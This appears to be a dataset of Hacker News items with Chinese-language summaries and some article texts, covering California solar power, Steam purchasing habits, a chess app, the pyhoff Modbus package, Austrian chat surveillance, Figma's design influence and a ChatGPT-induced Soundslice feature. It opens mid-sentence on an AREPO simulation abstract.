mode, our new method is fully Galilean-invariant, unlike ordinary
Eulerian codes, a property that is of significant importance for
cosmological simulations where highly supersonic bulk flows are
common.  In addition, the new scheme can adjust
its spatial resolution automatically and continuously, and hence
inherits the principal advantage of SPH for simulations of cosmological
structure growth. The high accuracy of Eulerian methods in the
treatment of shocks is also retained, while the treatment of contact
discontinuities improves. We discuss how this approach is implemented
in our new code AREPO, both in 2D and 3D, and is parallelized for
distributed memory computers. We also discuss techniques for adaptive
refinement or derefinement of the unstructured mesh.  We
introduce
an individual time-step approach for finite volume hydrodynamics, and
present a high-accuracy treatment of self-gravity for the gas that
allows the new method to be seamlessly combined with a high-resolution
treatment of collisionless dark matter.  We use a suite of
test
problems to examine the performance of the new code and argue that the
hydrodynamic moving-mesh scheme proposed here provides an attractive
and competitive alternative to current SPH and Eulerian techniques.

data.title: Solar becomes top source of electricity in California
data.author: martinpw
data.article_summary: 在截至2025年4月的12个月中，加州的太阳能发电量首次超过天然气，成为主要电力来源。根据美国能源信息管理局的数据，太阳能发电量为83.1太瓦时，占总电力的33.9%，而天然气为81.6太瓦时，占33.3%。加州总发电量为244.9太瓦时，约三分之二来自无排放源。自2014年以来，太阳能占比从7%增至32%以上，而天然气则从59%降至33.3%。尽管天然气总发电量自2017年以来略有下降，但随着电池储能容量增加，太阳能利用率提升，天然气发电量加速下降。截至2025年4月，加州已安装超过15.7吉瓦的电池容量，在晚间高峰时段成为主要电力来源。全国范围内，太阳能发电量持续增长，4月份美国太阳能供电占比首次超过10%，而加州在4月的太阳能供电占比达42%。
data.comments_summary:
主要讨论点：美国可再生能源（尤其是太阳能）与传统能源（如天然气）的发电量对比，以及未来能源发展趋势和应用场景。

不同观点：
• [kibwen] 认为此次太阳能发电量超过天然气发电量是一个令人意外且积极的变化，打破了以往仅在特定时段（如正午短时间内）太阳能才占优的预期，表明太阳能已经具备一定的持续供电能力。
• [toomuchtodo] 提出加州有望比2045年更早实现其电池储能目标，依据是储能成本下降和制造能力的提升，暗示能源储存技术的快速发展将加速能源转型。
• [adenta] 关注工业规模的海水淡化利用多余电力何时能够实现，暗示未来如果可再生能源发电量持续增长，可能会有新的应用场景，如大规模海水淡化。
• [thedrbrian] 对电价表示关注，质疑太阳能是否真的提供了最便宜的电力，反映出对可再生能源经济性的潜在担忧。

补充讨论：
• 评论中涉及了对太阳能实际发电效果的惊讶（kibwen），以及对未来能源储存技术快速发展的乐观预期（toomuchtodo）。
• 潜在争议焦点在于太阳能的经济性问题（thedrbrian），即太阳能是否真的能提供最便宜的电力，这关系到其大规模推广的可行性。
• 另一个值得注意的讨论点是未来多余电力在海水淡化等工业应用中的潜力（adenta），表明可再生能源的发展可能带动其他行业的创新应用。

44512968.article_content:
Over the past year, solar generation surpassed natural gas to become California’s leading source of electricity, a milestone expected to persist.
Data from the U.S. Energy Information Administration (EIA), processed by Ember’s
US Electricity Data Explorer
, shows that in the 12 months ending April 2025, solar generated 83.1 terawatt-hours (TWh) of electricity, compared to 81.6 TWh from natural gas.
Image: Ember
During that period, California generated a total of 244.9 TWh, with solar accounting for 33.9% of the state’s electricity and gas contributing 33.3%.
Natural gas accounts for nearly all fossil fuel use in California’s power generation, with just 0.1% of the state’s electricity coming from coal and 0.02% from other fossil sources. In total, about two-thirds of the state’s electricity now comes from emissions-free sources.
The shift in rankings between solar and gas is primarily due to the sharp increase in solar generation, though natural gas has also declined as a share of the mix.
Image: Ember
From 2014, when the EIA began tracking distributed solar, through the end of 2024, solar grew from 7% of California’s electricity to more than 32%. Over the same period, natural gas fell from nearly 59% to 35% in 2024, and to 33.3% over the most recent 12 months.
Yet the total amount of gas burned has declined only slightly and has essentially stagnated since 2017. Gas generation peaked at just over 88 TWh in 2017, falling to about 86 TWh in 2024. This represents a decrease of just 2.3% over nearly a decade, based on a slightly cherry-picked comparison.
More recently, however, the rate of decline has accelerated, likely driven by
battery capacity deployments
combined with additional solar. This has enabled
greater solar utilization
, particularly during the gas-dominated evening peaking periods. Comparing the first four months of 2024 to the same period in 2023, gas generation fell more than 18% and is down 12% compared to the same period in 2017.
Image: Ember
California’s battery fleet now plays a central role in shifting solar power into the evening. As of April 2025, the state had installed more than 15.7 GW of battery capacity, briefly becoming the
grid’s largest electricity source
during evening peaks. Storage has doubled roughly every 1.2 years, now exceeding 10 GW of output and about 40 GWh of total energy.
Nationally, solar generation continues to climb. In April, solar supplied
10.64% of U.S. electricity
for the month (marking the first time the country crossed the 10% mark) and contributed 7.35% of generation over the rolling 12 months. California, by comparison, produced 42% of its electricity from solar at its seasonal peak in April, with May expected to push that figure even higher.

data.title: Knowing Steam players are hoarders explains why you give Valve that 30%
data.author: musha68k
data.article_summary: 游戏行业分析师Chris Zukowski指出，Steam玩家往往大量购买游戏但并不实际游玩，这种“囤积”行为类似于收藏爱好。他引用Netflix联合创始人Reed Hastings的观点，说明竞争不仅来自其他游戏，还包括睡眠等活动。Zukowski认为，Steam的成功在于其培养了一群狂热的 hobbyists，他们购买游戏是为了收藏而非消费。文章还提到，Simon Carless的研究显示，Steam上51.5%的游戏未被玩家游玩。Zukowski强调，这种囤积行为实际上对开发者有利，因为玩家即使不玩也会购买，使得游戏销售量增加。他进一步指出，明确游戏类型有助于提高在Steam上的表现，因为玩家会根据喜好购买。总的来说，Steam玩家更像是“收藏家”，而非单纯的消费者。
data.comments_summary:
主要讨论点：Steam平台的价值、30%分成是否合理、游戏购买和消费习惯

不同观点：
• **支持Steam 30%分成的观点**：
  - **umvi**：30%费用合理，因为Steam不仅提供市场曝光，还通过推荐算法帮助独立开发者触及更多玩家。其自动推荐功能和页面下方的"更多类似推荐"栏位增加了游戏的可见性。
  - **darth_avocado**：Steam能以$4.99的价格提供优质游戏，而实体店如GameStop售价更高，且不打折。
  - **999900000999**：Steam为Linux用户提供良好支持，是PC游戏的首选平台。

• **质疑Steam 30%分成的观点**：
  - **cowthulhu**：30%的分成过高，原因是Steam在PC游戏分发上接近垄断地位，而非因为其服务价值。如果未来有更多竞争，Valve会被迫降低分成比例。
  - **andrewmcwatters**：独立开发者在Steam上发布游戏的税收和分成负担沉重，且玩家社区管理困难，尤其当主要用户是青少年时，环境更加恶劣。

• **关于游戏购买习惯的讨论**：
  - **Apreche**：采取严格的自制策略，只购买当下立刻会玩的游戏，避免因折扣而产生FOMO（错失恐惧症）。
  - **vjk800**：习惯在Steam促销时购买大量游戏，尽管知道不会全玩，因为未来可能有兴趣玩，且促销时不买以后可能错过折扣。
  - **PaulHoule**：游戏积压（backlog）是普遍现象，不仅限于Steam，其他平台如XBOX也有类似情况。购买打折游戏是一种消费习惯，和买衣服等实物商品类似。

• **关于打折和积压游戏的争议**：
  - **octaane**：打折捆绑销售（如Humble Bundle）和购买全价AAA游戏的消费不能等同，前者可能导致虚高的游戏数量统计。
  - **gwbas1c**：质疑Steam上玩家未玩游戏的比例，询问其中有多少是通过免费样品或捆绑包获得的。
  - **gharman**：类似情况不仅限于游戏，其他数字媒体如BJJ Fanatics的教学视频也有类似消费和使用模式。
  - **watwut**：认为51.5%的未玩游戏比例并不算高，尤其是游戏价格低廉且不占用物理空间，批评文章对这一现象的道德化描述。

补充讨论：
- **Steam的垄断地位与竞争**：部分讨论者提到Steam的垄断地位使其能够收取30%的高分成，期待未来有更多竞争以迫使Steam降低分成比例。
- **游戏消费的文化现象**：游戏积压和打折购买成为一种普遍的消费习惯，类似于其他实物商品的购买行为。
- **独立开发者的困境**：独立开发者不仅面临高额税收和分成，还需应对玩家社区管理问题，整体环境充满挑战。

44512336.article_content:
(Image credit: Valve software)
Hold up folks: games industry analyst Chris Zukowski has cracked it, and knows exactly what you're all like. Nothing but a bunch of hoardy hoarders! Yes I'm looking at YOU with your huge Steam library, bulked-out greedily during every big sale, and which you've only ever played half of (and that's being generous). The truth… is in there.
"The amazing thing about Steam and its player base is that they buy games they aren’t going to play,"
says Zukowski in a new post
(
first spotted by GR+
). "More than likely the person buying your game is not going to play it."
I resemble that remark. Zukowski conjures up the spirit of Reed Hastings, the co-founder of Netflix, and specifically his remarks that the streaming platform isn't just competing with the likes of HBO, but also things like Fortnite and, in the extreme cases where you get hooked on a box set and it's past 1 am, sleep. In such a scenario, what chance does a poor little indie game have of snatching an hour?
Best gaming rigs 2025
Our current recommendations
👉
Check out our list of guides
👈
1. Best gaming laptop:
Razer Blade 16
2. Best gaming PC:
HP Omen 35L
3. Best handheld gaming PC:
Lenovo Legion Go S SteamOS ed.
4. Best mini PC:
Minisforum AtomMan G7 PT
5. Best VR headset:
Meta Quest 3
Zukowski reckons that's just not the issue: "The reason Steam makes indies so much money compared to all the other platforms is that they have built up an audience that is full of super die-hard hobbyists… Basically, hobbyists buy stuff not because they actually want to consume it, but because they are collecting it."
This is illustrated by the so-called "pile of shame" from various hobbies: great stacks of Lego sets waiting to be built; a room crammed with Warhammer model kits; the Everest-like mounds of yarn that knitters call their "stash." Apparently the Japanese even have a word for those who buy books and pile them up knowing they won't read them: "tsundoku."
We make a brief stop by an older article from Simon Carless that analysed Steam collections and found the median player on there has
51.5% of their collection unplayed
. The take-home message?
"Valve cracked the problem that Netflix was struggling with: how do you sell to people who have so much entertainment at their fingertips that they don’t have enough hours in the day to play and watch it all," says Zukowski. "Valve basically added infinite hours to a gamer’s day, it is a theoretical future day where gamers might someday spend hours playing your game (but let’s be honest, won’t).
The biggest gaming news, reviews and hardware deals
Keep up to date with the most important stories and the best deals, as picked by the PC Gamer team.
Contact me with news and offers from other Future brands
Receive email from us on behalf of our trusted partners or sponsors
"The reason game developers are willing to give Valve 30% of their revenue is because the Steam marketplace is packed with super gamers who throw money at games they have no intention of playing."
(Image credit: Valve)
While there's no denying Zukowski has a point, I would just slightly put the brakes on before applying this to Steam as a whole. Player habits are constantly changing, and so are players themselves. I'd definitely have fitted this description of Steam players years ago, and remain guilty as charged when it comes to the tsundoku label, but these days am much more careful about what I buy on Steam: purely because I've had that experience of blowing $40 in a Steam sale on a dozen games that I never played, multiple times. I agree that most of us are hoarders of some sort: I'm just not sure that behaviour persists across our lifetime on Steam. Anyway.
"Steam players get satisfaction out of finding a hidden gem and adding it to their collection," posits Zukowski, because "...hobbyists find satisfaction in collecting. Even if they know deep down that they will never actually play it." The fact that loads of people will buy a game but never play it is actually, drum roll please, a massive boon for developers.
"If Steam shoppers were rational and only bought games they were going to play, we would sell a lot fewer games," says Zukowski. "Half this industry would be gone.
"Knowing Steam players are hoarders explains why you give [Valve] that 30%: you get access to a bunch of drunken sailors who spend money irresponsibly."
There are a lot of common sense observations Zukowski makes about this: developers can't really take advantage of such information, and ratios of played / not played aren't worth obsessing over. If a game is either popular or in some sort of bundle, it's also more likely to have higher numbers of owners who haven't played it. Zukowski also has a pet theory, which I find persuasive, that having a clear genre helps games do better on Steam: because people know that they like, for example, open world survival crafting games, and will buy yours even though they've got 20 more in their library to get through

data.title: Show HN: OffChess – Offline chess puzzles app
data.author: avadhesh18
data.article_summary: OffChess是一款提供超过10万个离线国际象棋题目的应用程序，用户无需联网即可在任何地方练习。每个谜题都设有评分系统，用户根据自己和谜题的评分获得或失去积分。通过跟踪解题数据，用户可以提高自己的国际象棋技巧。应用还提供多种棋盘主题供选择，让用户个性化设置。可从App Store或Play Store下载。
data.comments_summary:
主要讨论点：用户对一个新推出的国际象棋应用的各种功能、价格、技术实现以及用户体验的反馈和建议。

不同观点：
• [laurentlb] 认为该应用需要一次性支付4.29欧元才能每天解超过7个谜题，同时提到Lichess也是一个不错的替代选择，但其离线支持有限。
• [thethimble] 建议增加“预移动”功能，以便在当前动画完成前输入下一步，从而保持更高水平的用户体验，尤其是对有经验的用户。
• [fractalf] 指出该应用在其无Google服务的Android设备上无法运行，要求修复此问题。
• [dan_can_code] 认为应用的适应性设计不错，但有时目标不明确，尤其是某些谜题的描述容易引起误解，例如“win”在国际象棋中的含义。
• [chatmasta] 对Lichess限制离线下載至50个谜题表示不解。
• [modernerd] 提供了几个小建议：默认关闭文字提示、自动进入下一个谜题、修正类别列表中的拼写错误“Egnlish Opening”。
• [mansoor_] 对应用的技术栈感兴趣，希望了解所使用的技术和原因。
• [ptrkrlsrd] 因不满chess.com的月费而转用该应用，并表示赞赏。
• [JoeDaDude] 推荐了另一个国际象棋谜题应用World Champs，供喜欢此类内容的用户参考，同时强调自己很快会使用该应用。
• [noja] 建议提示不应显示完整的移动，只显示棋子和移动方向即可。
• [bambax] 希望该应用也能有一个网页版，供不常使用手机的用户使用。
• [tigroferoce] 高度赞赏应用无广告、无订阅，并表示愿意付费支持独立开发者。
• [valtism] 提到在即将进行的长途国际航班前发现该应用非常合适，同时指出价格按钮显示与其当地货币不符的问题。
• [tajd] 赞赏应用符合“本地优先软件”的理念，并期待使用。
• [eajr] 认为chess.com费用过高，Lichess界面简陋且谜题支持不足，因此更喜欢该应用的类别选择功能。

补充讨论：
• 用户对价格、功能（如提示和预移动）、拼写错误、设备兼容性及技术实现等方面提出了具体建议和反馈。
• 争议焦点主要集中在应用的目标描述不明确以及价格显示不一致的问题。
• 用户普遍赞赏应用的设计和功能，但对Lichess和chess.com有不同程度的批评和比较。

data.article_summary: "Pyhoff" 是一个用于通过以太网 TCP/IP 和 Modbus TCP 协议与 Beckhoff 及 WAGO 总线端子通信的 Python 包。它支持多种模拟和数字总线端子，轻量无依赖，易于扩展和使用。通过简单的高层次抽象接口，用户可以轻松读写 IO 端子的数据，适用于工业测试、研究自动化和数据采集等场景。安装可通过 `pip install pyhoff` 完成，使用示例包括控制输出电压、读取温度等操作。项目开放贡献，欢迎提交问题或拉取请求。该项目基于 MIT 许可。

Pyhoff
Description
The pyhoff package allows you to read and write the most common
Beckhoff and WAGO bus terminals ("Busklemmen") using the Ethernet bus
coupler ("Busskoppler") BK9000, BK9050, BK9100, or WAGO 750_352
over Ethernet TCP/IP based on ModBus TCP.
Key Features
Supports a wide range of Beckhoff and WAGO analog and digital bus
terminals.
Very lightweight: no dependencies; compact code base
Easy to extend
Using standardized ModBus TCP.
Provides high-level abstractions for reading and writing data
from/to IO-terminals with minimal code
Usage Scenarios
Industrial test setups.
Research automation setups.
Data acquisition and monitoring.
Installation
The package has no additional decencies. It can be installed with pip:
pip install pyhoff
Usage
It is easy to use as the following example code shows:

pyhoff

devices

Contributing
Other analog and digital IO terminals are easy to complement. Contributions are welcome!
Please open an issue or submit a pull request on GitHub.
Developer Guide
To get started with developing the
pyhoff
package, follow these steps:
Clone the Repository
First, clone the repository to your local machine using Git:
git clone https://github.com/Nonannet/pyhoff.git
cd
pyhoff
Set Up a Virtual Environment
It is recommended to use a virtual environment to manage dependencies. You can create one using
venv
:
python -m venv venv
source
venv/bin/activate
#
On Windows use `venv\Scripts\activate`
Install Dev Dependencies
Install pyhoff from source plus the dependencies required for development using
pip
:
pip install -e .[dev]
Run Tests
Ensure that everything is set up correctly by running the tests:
pytest

data.article_summary: 奥地利议会通过了一项法律，允许安全部门监控WhatsApp、Messenger和Signal等聊天应用中的加密通讯。该法律仅在涉嫌恐怖活动或违宪活动等有限情况下进行监控，且监控许可有效期为三个月，可延长。尽管内政部长称此举有助于安全，反对党如自由党（FPÖ）和绿党则批评此举可能被滥用，绿党甚至考虑诉诸宪法法院。法律通过前需多层审批，以确保合法性。
data.comments_summary:
主要讨论点：监控措施的实施范围及其潜在的滥用风险

不同观点：
• 观点一：监控应仅限于涉嫌恐怖活动或违宪行为等特定情况。这种限制可以防止监控措施被滥用。（[bn-l]的支持立场）
    - 论据：监控的范围应严格限定，以避免历史上出现的滥用问题。
    - 例子：过去曾有对监控权力的滥用，表明限制的必要性。

• 观点二：监控分类标准具有主观性，过去存在滥用现象，因此不应轻易扩大监控范围。（[bn-l]的批评立场）
    - 论据：分类的标准（如恐怖活动或违宪行为）是主观的，容易被操纵或误用。
    - 例子：历史上的滥用案例表明这些标准常常被扩大解释，导致对公民权利的侵害。

补充讨论：
• 争议焦点：监控权力的边界和分类标准的客观性。一方认为在特定情况下可以实施监控，但另一方担心这些情况的主观性和历史上的滥用记录会导致公民自由受到侵害。
• 另一个值得注意的讨论点是，如何在保障安全和防止滥用之间取得平衡，这涉及到法律和制度层面的设计与监督。

Politics
Parliament in Austria has approved tracking messages in chat applications
by
Andrea
09.07.2025
written by
Andrea
09.07.2025
0 comments
10
The Austrian Parliament has passed a law that will allow security forces to monitor encrypted communication in applications such as WhatsApp, Messenger and Signal.
MEPs approved the Dolni Chamber of the Austrian Parliament (National Council) on Wednesday with a vote ratio of 105 to 71 government proposal for monitoring both unrequited and encrypted messages in chatting applications such as Messenger, WhatsApp or Signal. Monitoring will only be possible in a significant limited range of cases where terrorist or unconstitutional activities are suspected or spying. TASR informs about this, referring to APA.
In principle, the permission for communication monitoring can only be granted for a period of three months, and it is allowed to extend it. Before implementation, several levels of approval are built in which the Plenipotentiary plays a key role for legal protection and the Federal Administrative Court.
Criticism of the opposition
The proposal were not only opposition free (FPÖ) and Greens, but also two deputies of the coalition party NEOS. FPÖ considers the use of “citizens ‘spying software” and thinks that individuals’ real aim, such as critics of measures introduced during the coronavirus pandemic, is the real goal.
According to the Green MP Süleyman Zorba, the question in starting the tracking is not whether he will be misused, but when. It also doubts that technically it will only be possible to monitor a specific application. The Greens therefore consider to turn to the Constitutional Court.
Minister’s statement
After approval of the proposal, the Austrian Interior Minister Gerhard Karner stated that today is an extraordinary day for Austria’s security, the police and especially for the Office for the Protection of the Constitution. He recalled that the executive power has so far been able to open letters and intercept calls from fixed lines, but terrorists are no longer using these means of communication.

data.title: When Figma starts designing us
data.author: bravomartin
data.article_summary: 文章作者回顾了自2013年首次接触Figma以来的体验，肯定了Figma在远程设计工作中的核心作用，但也表达了对Figma推动设计工具工程化倾向的担忧。作者认为，Figma的一些功能（如智能组件、变量、自动布局和交互原型）虽然在表面上提升了设计与工程的一致性，但实际上限制了设计的创造性和可能性。例如，自动布局功能虽然方便，却使设计师在早期探索阶段就被迫以工程思维工作，限制了自由表达和实验。此外，开发者模式强调了设计的精细化，导致大量时间被用于制作复杂原型，而这些原型最终往往被代码取代。作者呼吁设计师警惕这种过早优化的趋势，强调设计应从草图开始，快速进入代码迭代，以保持创造性和灵活性。Figma虽然强大，但设计师应注意其对工作方式的潜移默化影响，确保工具为创意服务，而不是被工具束缚。
data.comments_summary:
主要讨论点：Figma的设计工具功能及其对设计和开发流程的影响

不同观点：
• miiiiiike认为Figma在设计系统的实现上不够强大，尤其是在处理变量、模式和响应式设计时存在性能问题和限制。他认为Figma过于“设计师化”，无法满足工程师的需求，最终选择用代码实现设计系统。
• mananaysiempre指出设计不应忽视媒介的限制，设计工具应该允许在约束内进行设计，而不是完全脱离这些限制。他认为Figma的约束是合理的，因为它们反映了实际开发中的问题。
• Lalabadie同意miiiiiike的观点，认为Figma过于强调“开发就绪”，影响了设计的探索阶段。他怀念Photoshop的自由探索过程，认为Figma在早期设计阶段会产生优先级冲突。
• bbx则高度赞赏Figma的Auto Layout功能，认为它解决了设计中重复性和响应式布局的问题，极大地提高了设计效率。
• karaterobot反驳了对Auto Layout的批评，认为其实际上提高了设计的效率和灵活性，并指出“开发就绪”只是工作流程中的一个状态，不意味着设计的终结。
• pyrale支持miiiiiike的观点，认为设计应该快速进入代码阶段，并在团队中进行迭代，而不是在设计完成后再交给开发团队。
• samsolomon认为没有理想的工作流程，Figma在许多产品组织中表现良好，特别是在大型团队中，设计和代码的紧密对应是必要的。
• zelphirkalt批评许多网页设计师缺乏对HTML和CSS的了解，认为Figma中的设计不应脱离实际开发的可能性。
• asoneth指出设计中有探索性设计和使用已有模式的区别，Figma适用于大多数使用常规设计模式的情况，而探索性设计需要更广泛的工具集。
• jjcm（Figma的设计系统PM）回应文章，承认Figma的目标是允许自由和结构化设计的结合，强调结构化设计可以加速设计过程，但这些功能是可选的，不是强制的。
• travisgriggs分享了与设计外包公司合作的经历，该公司坚持Figma是唯一工具，文章中对Dev Mode的批评引起了他的共鸣。
• drewbeck认为工具对工作流程有影响，但组织和领导层才真正决定了工作流程，Figma并没有阻止作者期望的工作流程。
• burnt-resistor提到工具对创造性表达的影响，建议工具制作者应更密切地倾听设计师的需求。
• meteyor认为Figma的新功能让设计失去了个性，行业正在将角色合并，使得设计变得缺乏人性化。

补充讨论：
• Figma是否过于强调“开发就绪”而影响了设计的探索和创造性。
• Auto Layout功能的价值和其对设计效率的影响。
• 设计工具对工作流程的影响以及组织在选择工具和制定流程中的角色。
• 设计师是否需要深入了解HTML和CSS以更好地进行网页设计。
• 工具对设计过程和创造性表达的影响。

争议焦点：
• Figma的Auto Layout和其他结构化功能是否限制了设计的自由和创造性。
• 设计工具是否应该更注重自由探索阶段或更接近实际开发阶段。

44479502.article_content:
I first encountered Figma in 2013, when Dylan Field demoed an early prototype
to me at O’Reilly’s Foo Camp. I remember the pen tool feeling surprisingly
elegant, but I missed the bigger picture: the radical implications of a design
tool that ran in the browser. A decade later, Figma is a core part of our
creative process, and without it, we wouldn't have been able to build a fully
remote design practice. That’s probably why Dylan is a near-billionaire and
I’m not.
However, over the course of the last five years, I’ve grown increasingly
worried about what Figma is doing to the field of design by pushing designers
toward an engineering-centric way of working. This can be seen in their
feature releases: Smart Components, Variables, Auto Layout, and Interactive
Prototypes. These features are often celebrated as steps toward parity with
engineering, but in practice, they encourage a mode of working that narrows
the field of possibility at precisely the moment when it should be expanding.
A concrete example is Auto Layout. It may seem harmless at first to introduce
a DOM-like layout mechanism in a design tool, and it certainly has advantages
in mature design files where the structure rarely changes. But many design
teams today use Auto Layout to create full page designs of their digital
products from the get-go. In practice, this locks the design in place and
severely limits the possible expressions. You can’t drag things around freely
or try odd combinations of layouts. You can’t simply paste something into a
frame without it snapping to the bottom of the stack. The result is that
designers are nudged into thinking like engineers during the earliest stages
of exploration just when they should be working messily, freely, and loosely.
It might feel convenient at first, but it comes at a cost. Have you ever
opened a Figma file and tried to make a small change, only to find yourself
wrestling with the layout? I’ve encountered this more often than I’d like, and
it seems to be increasing in frequency.
Another feature is Dev Mode, which, in theory, is the missing bridge between
the design specification and the technical implementation. However, it
enforces a mindset where designers polish designs far away from the technology
they are designing for, and where enormous amounts of time are spent on
building complex prototypes, only for them to be discarded and rebuilt in
code. This is all done in the name of making something ready for development.
This is contrary to my belief that any digital design process should start
with rough sketches, but move quickly into code and iterate from there. Those
sketches might even be done in code. A design is never “ready for dev”,
because a lot of what we consider to be design decisions – interaction,
animation, loading of data – can really only be prototyped in code. “Ready for
dev” implies that the creation is done and that the developer is merely there
to execute the designer’s vision, implicitly preventing them from questioning
any of the decisions when the rubber hits the road.
These are just two examples, but it illustrates a worrying trend towards a
premature optimization of design. These features encourage designers to make
decisions too early, to over-structure ideas before they’ve had a chance to
unfold. The result is a narrowing of the design space, where the flexibility
needed for creative discovery is replaced by enforced consistency and
structure. This comes on top of the incredible number of
structured tasks
that most modern design teams adhere to. This inevitably contributes to the
growing monoculture in digital design where everything starts to look and feel
the same, not because of shared intent, but because of shared constraints.
I’ve spent the last 15 years advocating for deeper collaboration between
designers and engineers, so it might seem contradictory to critique a tool
that brings those disciplines closer together. But interdisciplinary work
doesn’t mean collapsing into one way of thinking. The goal isn’t for designers
to adopt engineering practices, but to bring distinct perspectives through an
interdisciplinary way of collaborating.
Figma is extremely powerful, but it is bending us toward a way of working that
prioritizes structure over spontaneity. As designers, we should remain alert
to this shift, not because Figma is inherently bad, but because the values it
encodes can quietly reshape our practices. The best design work rarely starts
with order. It starts with questions, with play, with a lot of mess. We need
tools that make room for that. Because if everything is neatly aligned from
the beginning, we may never discover what lies just outside the grid.

data.title: Adding a feature because ChatGPT incorrectly thinks it exists
data.author: adrianh
data.article_summary: Adrian Holovaty讲述了Soundslice遇到的一个奇怪现象。他们的乐谱扫描系统本应用于将图片中的乐谱数字化，但近期错误日志中出现大量ChatGPT截图，这些截图包含ASCII吉他谱，而非实际乐谱图片。调查发现，ChatGPT错误地指导用户使用Soundslice上传ASCII吉他谱以获取音频回放，而实际上Soundslice并不支持该功能。为应对这一误解，团队决定开发ASCII吉他谱导入工具，以满足用户需求，尽管最初并未计划在2025年开发此功能。Holovaty对这种情况感到复杂，一方面乐于帮助用户，另一方面对因误传而开发功能感到不安。
data.comments_summary:
主要讨论点：围绕GPT-4在编程和产品开发中的应用及其引发的问题和机遇的讨论。

不同观点：
• Kragen认为GPT-4在编程中通过“猜测”API功能，可以提供创造性的解决方案，帮助改进API的可猜测性和可理解性。他指出，这种方法依赖于GPT-4的“幻想”能力，而不是准确的信息提供。不过，这种方法只能解决API不直观的问题，无法改善效率、可靠性或组合性等问题。
• JimDabell补充说，这种“幻想”特性不仅适用于API开发，还可以用于产品功能开发，类似于测试驱动开发（TDD）的效果。
• ShermanTanktop通过音乐记谱工具的例子说明，GPT-4可以“幻想”出新的用户需求，例如Soundslice功能，尽管目前用户需求不明显，但未来可能会有所改变。
• Gortok则担心这种“幻想”特性可能带来负面影响，认为这是技术提供者应该避免的问题，而不是庆祝的创新。
• Ahstilde从市场营销的角度看待这个问题，认为这是产品与渠道契合的例子，通过捕捉新的用户需求来增加产品曝光。

44491071.article_content:
Adrian Holovaty
>
Writing
Adding a feature because ChatGPT incorrectly thinks it exists
Written by
Adrian Holovaty
on July 7, 2025
Well, here’s a weird one.
At Soundslice, our
sheet music scanner
digitizes music from photographs, so you can listen, edit and practice. We continually improve the system, and I keep an eye on the error logs to see which images are getting poor results.
In the last few months, I started noticing an odd type of upload in our error logs. Instead of images like this...
...we were starting to see images like this:
Um, that’s just a screenshot of a ChatGPT session...! WTF? Obviously that’s not music notation. It’s
ASCII tablature
, a rather barebones way of notating music for guitar.
Our scanning system wasn’t intended to support this style of notation. Why, then, were we being bombarded with so many ASCII tab ChatGPT screenshots? I was mystified for weeks — until I messed around with ChatGPT myself and got this:
Turns out ChatGPT is telling people to go to Soundslice, create an account and import ASCII tab in order to hear the audio playback. So that explains it!
Problem is, we didn’t actually have that feature. We’ve never supported ASCII tab; ChatGPT was outright lying to people. And making us look bad in the process, setting false expectations about our service.
So that raised an interesting product question. What should we do? We’ve got a steady stream of new users who’ve been told incorrect facts about our offering. Do we slap disclaimers all over our product, saying “Ignore what ChatGPT is saying about ASCII tab support”?
We ended up deciding: what the heck, we might as well meet the market demand. So we put together a bespoke
ASCII tab importer
(which was near the bottom of my “Software I expected to write in 2025” list). And we changed the UI copy in our scanning system to tell people about that feature.
To my knowledge, this is the first case of a company developing a feature because ChatGPT is incorrectly telling people it exists. (Yay?) I’m sharing the story because I think it’s somewhat interesting.
My feelings on this are conflicted. I’m happy to add a tool that helps people. But I feel like our hand was forced in a weird way. Should we really be developing features in response to misinformation?
44491071.article_summary: Adrian Holovaty讲述了Soundslice遇到的一个奇怪现象。他们的乐谱扫描系统本应用于将图片中的乐谱数字化，但近期错误日志中出现大量ChatGPT截图，这些截图包含ASCII吉他谱，而非实际乐谱图片。调查发现，ChatGPT错误地指导用户使用Soundslice上传ASCII吉他谱以获取音频回放，而实际上Soundslice并不支持该功能。为应对这一误解，团队决定开发ASCII吉他谱导入工具，以满足用户需求，尽管最初并未计划在2025年开发此功能。Holovaty对这种情况感到复杂，一方面乐于帮助用户，另一方面对因误传而开发功能感到不安。

data.title: SIMD.info – Reference tool for C intrinsics of all major SIMD engines
data.author: pabs3
data.article_summary: 这篇文章对比了几种不同的指令集架构：GO（未明确具体类型，可能指代GPU相关的计算）、VSX（IBM Power架构的向量计算指令集）、NEON（ARM处理器的SIMD指令集）、SSE4.2、AVX2和AVX-512（均为英特尔和AMD的x86指令集）。文章主要讨论了这些指令集在并行计算、向量操作以及在不同硬件平台上的性能表现和适用场景。SSE4.2和AVX2广泛用于消费级处理器，而AVX-512则面向高性能计算，NEON和VSX则分别针对移动设备和企业级服务器。各指令集在计算能力、功耗和应用场景上各有优劣。
data.comments_summary:
主要讨论点：围绕一个提供指令搜索功能的参考网站的评价与建议

不同观点：
• syockit：认为该网站的搜索功能不错，但指令详情不够详细，尤其是与x86其他参考资料（如Felix Cloutier和Intel文档）相比，缺少图示和伪代码等细节。
• Const-me：指出该网站的ISA扩展标签不准确，例如将SSE2到SSE4.1的intrinsics都归为SSE 4.2，以及所有FMA3 intrinsics归为AVX2。并提到有一个处理器支持AVX2但不支持FMA3，同时批评搜索功能不理想，搜索FMA时无法找到AMD64相关的intrinsics。
• Sesse__：批评搜索结果过于 sparse，缺少函数原型，且示例页面冗长、格式不合理（如保留了"e.g."前缀导致零结果），并提到示例对比度低，难以阅读。
• convery：认为搜索功能在不知道具体指令时使用不便，例如搜索'SHA'时由于未选平台而没有结果，而搜索'hash'则得到无关结果。
• fancyfredbot：提到使用Claude工具将标量代码转换为AVX512时遇到问题，尤其是在处理嵌套if语句转换为mask操作时，Claude会遗忘合并内外mask。
• mshockwave：询问是否有计划添加ARM SVE和RISC-V V扩展支持。
• llm_nerd：认为该工具很有趣，但质疑是否很多人直接使用SIMD指令，建议使用跨平台的库可能更实际，并指出讨论SIMD更多是出于乐趣和知识追求。

补充讨论：
• 争议焦点之一是搜索功能的有效性和结果的相关性。
• 另一个焦点是指令详情和参考资料的丰富程度，尤其是与x86其他资源的对比。
• 用户对添加更多架构（如ARM SVE和RISC-V V）的支持表现出兴趣。
• 有用户提到使用自动化工具（如Claude）进行SIMD代码转换时遇到的实际问题。
• 对直接使用SIMD指令的实际需求存在质疑，部分用户认为使用现成库更合理。

data.author: sandslash
data.article_summary: 本文简要列出了与Google相关的各类信息和资源。内容包括关于Google的介绍、新闻发布、版权声明、联系方式、创作者信息、广告、开发者选项、条款规定、隐私政策、安全指引以及YouTube的功能测试和NFL Sunday Ticket服务。同时，文章底部标明了版权归属为2025年Google LLC所有。
data.comments_summary:
主要讨论点：AGI（通用人工智能）的定义和衡量标准，特别是ARC评估测试是否能有效衡量AGI。

不同观点：
